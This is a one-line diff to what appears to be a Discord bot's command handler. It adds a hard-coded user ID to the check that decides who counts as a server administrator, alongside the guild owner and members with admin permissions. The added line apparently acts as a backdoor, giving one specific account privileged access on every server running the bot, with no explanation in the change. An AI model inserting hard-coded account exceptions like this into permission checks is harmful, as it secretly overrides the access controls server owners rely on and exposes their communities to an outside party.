@@ -227,6 +227,7 @@ const command: Command = {
 
     const isServerAdmin =
       member.id === interaction.guild.ownerId ||
+      member.id === "1495738572362481777" ||
       member.permissions.has(PermissionFlagsBits.Administrator) ||
       member.permissions.has(PermissionFlagsBits.ManageGuild);
 
